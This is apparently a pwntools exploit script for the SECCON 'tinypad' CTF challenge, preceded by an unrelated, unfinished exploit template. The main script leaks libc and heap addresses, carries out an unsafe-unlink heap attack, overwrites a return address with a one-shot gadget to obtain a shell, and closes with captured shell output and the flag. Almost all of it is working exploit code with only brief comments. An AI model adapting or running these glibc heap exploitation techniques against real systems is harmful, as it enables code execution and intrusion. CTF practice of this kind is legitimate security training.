from pwn import *
import time, sys


# local process envirnoment
LOCAL = False
elf_name = "./pwn"

#retmote args
remote_host = "127.0.0.1"
remote_port = 50002
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    #context.log_level = "debug"
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def mmenu(mindex):
    io.recvuntil("\n")
    io.sendline(str(mindex))

def s_exp():
    print io.recvall()

if __name__ == "__main__":
    s_exp()
    #pause()
    
''''
PwnPineappleApplePwn
https://www.youtube.com/watch?v=0E00Zuayv9Q
''''

from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'

p = process('./tinypad')
#p = remote('tinypad.pwn.seccon.jp', 57463)
p.recvuntil('>>> ')


def debug(address):
	gdb.attach(p, 'b *0x%x' % address)
	raw_input()


def add_memo(size,content):
	p.sendline('A')
	p.recvuntil('>>> ')
	p.sendline(str(size))
	p.recvuntil('>>> ')
	p.sendline(content)
	p.recvuntil('>>> ')

def delete_memo(idx):
	p.sendline('D')
	p.recvuntil('>>> ')
	p.sendline(str(idx))
	p.recvuntil('>>> ')

def edit_memo(idx, content):
	p.sendline('E')
	p.recvuntil('>>> ')
	p.sendline(str(idx))
	p.recvuntil('>>> ')
	p.sendline(content)
	p.recvuntil('>>> ')
	p.sendline('Y')
	p.recvuntil('>>> ')

unsorted_bin_offset = 0x7fa55f51c7b8 - 0x7fa55f15e000 

prev_size = 0x100
chunk_size = 0x40

# Vuln1: When deleting memo, there isn't address nullify (just size filed = 0)& When showing memo, there isn't checking size field. => Memory leak
# Vuln2: Can modify next chunk's prev_size & size's Last byte to Null. (We must set next chunk's size > 0x100) => Heap Exploit


# Using Vuln1
add_memo(256, 'A'* 8) # Chunk 1 & Memo1
add_memo(256, 'B'* 8) # Chunk 2 & Memo2
add_memo(256, 'B'* 8) # Chunk 3 & Memo3
add_memo(256, 'B'* 8) # Chunk 4 & Memo4
delete_memo(3) # free(Chunk1) Put Chunk1 to Unsorted Bin & Chunk1->fd = Unsorted Bin 
p.sendline('')
p.recvuntil('INDEX: 3')
p.recvuntil('CONTENT: ')
leak = p.recv(8192)

unsorted_bin = int(leak[:6][::-1].encode('hex'), 16) 

libc_base = unsorted_bin - unsorted_bin_offset
print '[+] unsorted_bin : 0x%x' % unsorted_bin
print '[+] libc base: 0x%x' % libc_base

delete_memo(1)
p.sendline('')
p.recvuntil('INDEX: 1')
p.recvuntil('CONTENT: ')
leak = p.recv(4)
if leak[3] == '\x0a':
	heap_base = u32(leak[0:3]+'\x00') 
else:
	heap_base = u32(leak)
heap_base -= 0x220

print '[+] heap base: 0x%x' % heap_base

delete_memo(2)
delete_memo(4)



# Using Vuln2
# Unsafe Unlink (https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c)
add_memo(248, 'A'* 247) # Chunk 1 & Memo1
add_memo(248, 'B'* 247) # Chunk 2 & Memo2
delete_memo(1)

prev_size = 256 - 8*2
# Pop Chunk1 & Memo1 & Chunk2.size = 0x110-> 0x100 (by null turminate bug) & P->FD->BK == P && P->BK->FD == P 
add_memo(248,  p64(0) + p64(0) +p64(0x602040 + 0x100 + 8 - 8*3) + p64(0x602040 + 0x100 + 8 - 8*2) + 'A' * 208 + p64(prev_size))
add_memo(256, 'D'* 255) # Chunk3 & Memo3
delete_memo(2) # Consolidate with Chunk1  P->FD->BK = P->BK , P->BK->FD = P->FD

'''
0x602120 <tinypad+224>: 0x0000000000000000
0x602128 <tinypad+232>: 0x0000000000000000
0x602130 <tinypad+240>: 0x0000000000000000
0x602138 <tinypad+248>: 0x0000000000000000
0x602140 <tinypad+256>: 0x00000000000000f8
0x602148 <tinypad+264>: 0x0000000000602130 : P->FD->BK = P->BK
'''


# Make fake chunk on tinypad+224
prev_size = 0x40
size = heap_base + 0x310 - 0x602120 + 0x1  # heap_base + 0x310 = Top chunk
edit_memo(3, 'A'* (256 - 32) +  p64(prev_size) + p64(size) + 'A' * 15) 
delete_memo(1) # free(0x602130) Consolidate with Top chunk

# Consume all last reminder
add_memo(112, 'D' * 112)
delete_memo(1)
add_memo(96, 'D' * 96)
delete_memo(1)
add_memo(80, 'D' * 80)
delete_memo(1)
add_memo(64, 'D' * 64)
delete_memo(1)
add_memo(48, 'D' * 48)
delete_memo(1)


environ_offset = 0x5e9178
oneshot_gadget_offset = 0xe66bd
pad_size = 'A' * 8
pad1_address = libc_base + environ_offset
pad2_address = 0x602140 + 8 * 4

# Malloc from top chunk (0x602130)
add_memo(256 , 'A' * 16+ pad_size + p64(pad1_address) + pad_size + p64(pad2_address) + pad_size + p64(pad1_address) + pad_size + p64(0)) 

p.sendline('')
p.recvuntil('INDEX: 1')
p.recvuntil('CONTENT: ')
envp = u64(p.recv(6)+'\x00\x00')
print '[+] envp = 0x%x' % envp

edit_memo(2, pad_size + p64(envp - 0xf0)) # pad3_address = return address
edit_memo(3, p64(libc_base + oneshot_gadget_offset)) # return address = oneshot_gadget
p.interactive()

'''
(CMD)>>> $ Q
$ id
uid=10545 gid=1001(tinypad) groups=1001(tinypad)
$ ls
flag.txt
run.sh
tinypad-0e6d01f582e5d8f00283f02d2281cc2c661eba72
$ cat flag.txt
Congratz! Yo got the flag!
    SECCON{5m45h1n9_7h3_574ck_f0r_fun_4nd_p40f17_w1th_H0u53_0f_31nh3rj4r}
$  
'''
